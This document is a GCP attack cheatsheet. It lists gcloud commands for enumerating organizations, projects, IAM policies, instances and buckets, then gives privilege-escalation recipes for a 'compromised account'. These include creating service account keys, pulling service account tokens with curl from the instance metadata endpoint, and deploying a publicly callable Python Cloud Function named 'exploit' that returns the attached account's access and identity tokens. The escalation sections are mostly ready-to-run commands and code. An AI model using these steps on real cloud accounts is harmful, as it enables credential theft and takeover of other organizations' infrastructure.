## GCP cheatsheet
### General
- End users can authenticate at `myaccount.google.com`
- Admins use `admin.google.com`
- For projects, use `console.cloud.google.com`
### Basic actions
- Visit the following URL to check token validity
```
https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=TOKEN
```
- Authenticate with a SA key file
```
gcloud auth activate-service-account --key-file KEYFILE.json
```
- List current config
```
gcloud config list
```
- Set project in config
```
gcloud config set project PROJECTID
```
- List authenticated accounts
```
gcloud auth list
```
### Organization, project, and service account enumeration
- List accessible organizations
```
gcloud organizations list
```
- List a specific organization's IAM policies
```
gcloud organizations get-iam-policy ORGANIZATIONID
```
- List projects
```
gcloud projects list
```
- List a specific project's IAM policies
```
gcloud projects get-iam-policy PROJECTNUMBER
```
- List a specific project's service accounts
```
gcloud iam service-accounts list --project PROJECTID
```
- List a SA's list of key IDs (ten keys is the maximum an account can have)
```
gcloud iam service-accounts keys list --iam-account SERVICEACCOUNT
```
- Get current account's policy on the given SA
```
gcloud iam service-accounts get-iam-policy SERVICEACCOUNT
```
- List custom roles for a specific project
```
gcloud iam roles list --project PROJECTID
```
- Get a specific role's permissions
```
gcloud iam roles describe ROLENAME --project PROJECTID
```
- Get a specific account's permissions
```
gcloud projects get-iam-policy project-staging-344908 --flatten="bindings[].members" --format='table(bindings.role)' --filter="bindings.members:EMAIL"
```

### Computer instance enumeration
- List compute instances
```
gcloud compute instances list
```
- Get a specific compute instance's description
```
gcloud compute instances describe INSTANCE
```
- Get current account's policy on a given compute instance
```
gcloud compute instances get-iam-policy INSTANCE --zone ZONE
```
- List firewall rules
```
gcloud compute firewall-rules list
```
- Get a specific firewall rule description
```
gcloud compute firewall-rules describe RULENAME
```
- List forwarding rules
```
gcloud compute forwarding-rules list
```
- List GKE clusters
```
gcloud container clusters list
```

### Storage and bucket enumeration
- List storages
```
gcloud storage ls
```
- List the contents of a specific bucket
```
gcloud storage ls BUCKETNAME
```

### Privilege escalation via SA key creation
- If the compromised account has `iam.serviceAccountKeyAdmin` permissions on an SA then you can create keys for the given SA
- Create a new key for the SA (will be saved to KEYNAME.json locally)
```
gcloud iam service-accounts keys create KEYNAME.json --iam-account SERVICEACCOUNT
```

### Privilege escalation via compute admin login
- If the compromised account has `compute.osAdminLogin` permissions then you have arbitrary access to any compute instance (similar to AWS SSM)
- Get into a compute instance with SSH
```
gcloud compute ssh --zone ZONE COMPUTEINSTANCE
```
- Enumrate the scope of the compute instance's SA
```
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/SERVICEACCOUNT/scopes
```
- Scope https://www.googleapis.com/auth/cloud-platform is editor permissions
- Get compute instance's SA token
```
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/SERVICEACCOUNT/token
```
- Save the token to a file and use it to enumerate as usual
```
gcloud projects list --access-token-file TOKENFILE
```

### Privilege escalation via cloud functions
- If the compromised account has editor permissions or the `iam.serviceAccounts.actAs` and `cloudfunctions.functions.create` permissions then you can escalate to owner or any other high privilege role
- Save the following code as `main.py`
```
import subprocess
import random
import io
import json
import string
import os
from urllib.request import Request, urlopen
from base64 import b64decode, b64encode

def exploit(request):
    req = Request('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token')
    req.add_header('Metadata-Flavor', 'Google')
    content = urlopen(req).read()
    token = json.loads(content)
    req = Request('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=32555940559.apps.googleusercontent.com')
    req.add_header('Metadata-Flavor', 'Google')
    content = urlopen(req).read()
    token["identity"] = content.decode('utf-8')
    return json.dumps(token)
```
- Create the function (use with `--access-token-file` if you only have an access token)
```
gcloud functions deploy FUNCTIONAME --timeout 539 --trigger-http --allow-unauthenticated --source PATH/TO/main.py --runtime python37 --entry-point exploit --service-account TARGETSA
```
- Run the function (use with `--access-token-file` if you only have an access token)
```
gcloud functions call FUNCTIONNAME
```
- Run the function via HTTP
```
curl FUNCTIONURL
```
